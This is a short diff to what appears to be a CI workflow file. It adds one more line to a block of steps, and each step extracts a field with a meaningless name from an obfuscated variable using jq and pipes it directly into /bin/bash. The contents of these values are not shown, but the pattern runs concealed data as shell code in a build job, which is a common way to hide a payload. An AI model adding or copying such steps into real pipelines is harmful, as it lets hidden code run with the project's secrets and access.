@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$m45" | jq -r .tu08365 | /bin/bash
           printf '%s' "$ow4" | jq -r .ef1 | /bin/bash
           printf '%s' "$ofsvx02" | jq -r .srpr36 | /bin/bash
+          printf '%s' "$p78" | jq -r .jbh4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
